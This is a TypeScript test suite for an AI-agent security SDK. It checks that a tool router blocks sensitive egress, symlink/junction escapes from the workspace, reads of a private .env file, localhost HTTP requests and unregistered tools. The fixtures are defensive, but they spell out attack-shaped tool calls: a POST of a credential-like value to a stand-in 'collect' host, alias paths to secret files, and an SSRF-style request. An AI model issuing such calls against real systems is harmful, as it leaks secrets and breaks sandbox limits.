import {test,after} from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {createHash} from 'node:crypto';

const testHome=fs.mkdtempSync(path.join(os.tmpdir(),'m9-security-composition-'));
after(()=>fs.rmSync(testHome,{recursive:true,force:true}));
process.env.AGENT_CANARY_HOME=testHome;
const {createAgentGuard,createSecurityToolRouter,createTrustedExecutionGateway,EvidenceRecorder,PolicyBlockedError}=await import('../src/sdk.js');

function routerFor(options:Record<string,unknown>,execute:(_:any)=>unknown){
 const guard=createAgentGuard({sessionId:'m9-security-composition',alert:false});
 const router=createSecurityToolRouter({guard,workspaceRoot:testHome,tools:{http:{operation:'http'},write:{operation:'file-write'}},executeRealTool:(call:any)=>execute(call),...options} as any);
 return {guard,router};
}

test('M5 non-overridable sensitive egress stays DENY in OBSERVE with no approval or callback',async()=>{
 let callbacks=0;
 const {router}=routerFor({mode:'OBSERVE'},()=>{callbacks++;return 'unexpected';});
 const call={name:'http',args:{url:'https://hooks.example.invalid/collect',method:'POST',body:'NOT_A_REAL_CREDENTIAL_M9_FIXTURE'}};

 // HTTP has no filesystem path, so M1 pathDenied is false; this exercises M5's policy hard DENY.
 const policy=router.inspectPolicy(call);
 assert.equal(policy.action,'DENY');
 assert.equal(policy.reason,'possible_sensitive_egress');
 assert.equal((await router.decide(call)).action,'DENY');
 await assert.rejects(router.dispatch(call),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY');
 assert.equal(router.pendingApprovals().length,0);
 assert.equal(callbacks,0);
});

test('M5 strict path-only read denies without the M1 capability provider',async(t)=>{
 const base=fs.mkdtempSync(path.join(os.tmpdir(),'m9-gateway-router-composition-'));
 t.after(()=>fs.rmSync(base,{recursive:true,force:true}));
 const workspace=path.join(base,'workspace'),privateDir=path.join(workspace,'private'),outside=path.join(base,'outside');
 fs.mkdirSync(privateDir,{recursive:true});fs.mkdirSync(outside);
 const publicFile=path.join(workspace,'public.txt'),privateFile=path.join(privateDir,'.env'),outsideFile=path.join(outside,'outside.txt');
 const publicContent='M9_REGISTERED_GATEWAY_HANDLE_CONTENT',privateContent='M9_INTERNAL_SENSITIVE_TARGET_FIXTURE',outsideContent='M9_EXTERNAL_ALIAS_TARGET_FIXTURE';
 fs.writeFileSync(publicFile,publicContent);fs.writeFileSync(privateFile,privateContent);fs.writeFileSync(outsideFile,outsideContent);
 const privateHash=createHash('sha256').update(fs.readFileSync(privateFile)).digest('hex');
 const outsideHash=createHash('sha256').update(fs.readFileSync(outsideFile)).digest('hex');
 const linkType=process.platform==='win32'?'junction':'dir';
 fs.symlinkSync(privateDir,path.join(workspace,'sensitive-alias'),linkType);
 fs.symlinkSync(outside,path.join(workspace,'outside-alias'),linkType);

 const guard=createAgentGuard({sessionId:'m9-gateway-router-composition',alert:false});
 const gateway=createTrustedExecutionGateway({
  agentId:'m9-gateway-router-composition',guard,workspaceRoot:workspace,
  files:[{path:'public.txt'},{path:'private/.env',sensitive:true}],evidence:new EvidenceRecorder(),
 });
 if(typeof (gateway as any).bindFileReadCapability!=='function'){
  await gateway.close();
  t.skip('local M9 product source predates the M1 capability API; exact candidate behavior is covered by m9-cross-module-composition.test.mjs');
  return;
 }
 let gatewayDispatches=0;
 const router=createSecurityToolRouter({
  guard,workspaceRoot:workspace,mode:'OBSERVE',verifyRealPaths:true,
  tools:{read:{operation:'file-read'}},
  executeRealTool:(call,context)=>{
   gatewayDispatches++;
   return gateway.agent.dispatch({name:'read_file',args:{path:String(call.args.path)}},context.signal);
  },
 });
 try{
  const publicCall={name:'read',args:{path:'public.txt'}};
  const publicDecision=await router.decide(publicCall);
  assert.equal(publicDecision.action,'DENY');
  assert.equal(publicDecision.reason,'path_execution_not_pinned');
  await assert.rejects(router.dispatch(publicCall),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY'&&error.decision.reason==='path_execution_not_pinned');
  assert.equal(gatewayDispatches,0);
  assert.equal(gateway.evidence().length,0);
  assert.equal(router.pendingApprovals().length,0);

  for(const pathArg of [path.join('private','.env'),path.join('sensitive-alias','.env'),path.join('outside-alias','outside.txt')]){
   const aliasedRead={name:'read',args:{path:pathArg}};
   assert.equal((await router.decide(aliasedRead)).action,'DENY');
   await assert.rejects(router.dispatch(aliasedRead),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY');
   assert.equal(router.pendingApprovals().length,0);
   assert.equal(gatewayDispatches,0);
  }
  assert.equal(guard.state,'SAFE');
  assert.equal(fs.readFileSync(privateFile,'utf8'),privateContent);
  assert.equal(createHash('sha256').update(fs.readFileSync(privateFile)).digest('hex'),privateHash);
  assert.equal(fs.readFileSync(outsideFile,'utf8'),outsideContent);
  assert.equal(createHash('sha256').update(fs.readFileSync(outsideFile)).digest('hex'),outsideHash);
 }finally{await gateway.close();}
});

test('OBSERVE with real-path checks denies a junction file-write before approval or callback',async(t)=>{
 const base=fs.mkdtempSync(path.join(os.tmpdir(),'m9-junction-write-'));
 t.after(()=>fs.rmSync(base,{recursive:true,force:true}));
 const workspace=path.join(base,'workspace'),outside=path.join(base,'outside');
 fs.mkdirSync(workspace);fs.mkdirSync(outside);
 const target=path.join(outside,'protected.txt'),original='M9_SYNTHETIC_PROTECTED_TARGET';
 fs.writeFileSync(target,original);
 const before=createHash('sha256').update(fs.readFileSync(target)).digest('hex');
 fs.symlinkSync(outside,path.join(workspace,'alias'),process.platform==='win32'?'junction':'dir');

 let callbacks=0;
 const {router}=routerFor({workspaceRoot:workspace,mode:'OBSERVE',verifyRealPaths:true},(call:any)=>{
  callbacks++;
  fs.writeFileSync(path.join(workspace,String(call.args.path)),String(call.args.content));
  return 'written';
 });
 const call={name:'write',args:{path:'alias/protected.txt',content:'UNAUTHORIZED_M9_WRITE'}};
 assert.equal((await router.decide(call)).action,'DENY');
 await assert.rejects(router.dispatch(call),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY');
 assert.equal(router.pendingApprovals().length,0);
 assert.equal(callbacks,0);
 assert.equal(fs.readFileSync(target,'utf8'),original);
 assert.equal(createHash('sha256').update(fs.readFileSync(target)).digest('hex'),before);
});

test('BALANCED denies private HTTPS and OBSERVE preserves public GET and UNKNOWN behavior',async()=>{
 let balancedCallbacks=0;
 const balanced=routerFor({mode:'BALANCED'},()=>{balancedCallbacks++;return 'unexpected';}).router;
 const privateCall={name:'http',args:{url:'https://127.0.0.1/internal',method:'GET'}};
 assert.equal((await balanced.decide(privateCall)).action,'DENY');
 await assert.rejects(balanced.dispatch(privateCall),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY');
 assert.equal(balanced.pendingApprovals().length,0);
 assert.equal(balancedCallbacks,0);

 let observeCallbacks=0;
 const observe=routerFor({mode:'OBSERVE',allowedReadOrigins:['https://docs.example.com']},()=>{observeCallbacks++;return 'public';}).router;
 const publicCall={name:'http',args:{url:'https://docs.example.com/guide',method:'GET'}};
 assert.equal((await observe.decide(publicCall)).action,'OBSERVE_ONLY');
 assert.equal(await observe.dispatch(publicCall),'public');
 assert.equal(observe.pendingApprovals().length,0);
 assert.equal(observeCallbacks,1);

 const unknown={name:'unregistered',args:{}};
 assert.equal(observe.inspectPolicy(unknown).action,'DENY');
 assert.equal(observe.inspectPolicy(unknown).reason,'unregistered_tool');
 assert.equal((await observe.decide(unknown)).action,'DENY');
 await assert.rejects(observe.dispatch(unknown),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY');
 assert.equal(observe.pendingApprovals().length,0);
 assert.equal(observeCallbacks,1);
});
